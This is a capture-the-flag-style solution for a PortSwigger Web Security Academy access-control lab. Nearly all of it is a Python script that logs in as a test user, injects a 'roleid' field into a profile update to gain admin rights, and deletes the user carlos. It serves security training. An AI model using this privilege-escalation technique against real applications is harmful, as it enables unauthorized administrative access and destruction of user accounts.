# Lab: User role can be modified in user profile

Link to lab: https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile

## Solution

```python
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup


url = 'https://0a9400b503486fc9c6c149440023008c.web-security-academy.net/'

session = requests.Session()

response = session.get(
    url + 'login',
    verify=False,
)

data = {
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    url + 'login',
    data=data,
    verify=False,
    allow_redirects=False
)

session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]


cookies = {
    'session': session
}

data = {
    "email":"wiener@normal-user.net",
    "roleid":2
}

response = requests.post(
    url + 'my-account/change-email',
    cookies=cookies,
    data=data,
    verify=False,
)

response = requests.get(
    url + 'admin/delete?username=carlos',
    cookies=cookies,
    verify= False
)

print(response.text)
```